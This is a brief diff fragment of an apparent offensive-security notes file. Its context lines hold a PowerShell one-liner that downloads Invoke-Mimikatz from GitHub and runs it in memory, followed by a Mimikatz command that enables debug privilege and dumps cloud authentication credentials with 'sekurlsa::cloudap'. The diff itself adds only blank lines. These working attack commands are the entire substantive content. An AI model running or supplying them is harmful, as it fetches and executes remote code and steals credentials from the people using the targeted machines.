@@ -17,3 +17,5 @@ updated_at: '2023-05-25T07:04:18.489561+00:00'
 PS> iex (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1")
 PS> Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::cloudap"'
 ```
+
+
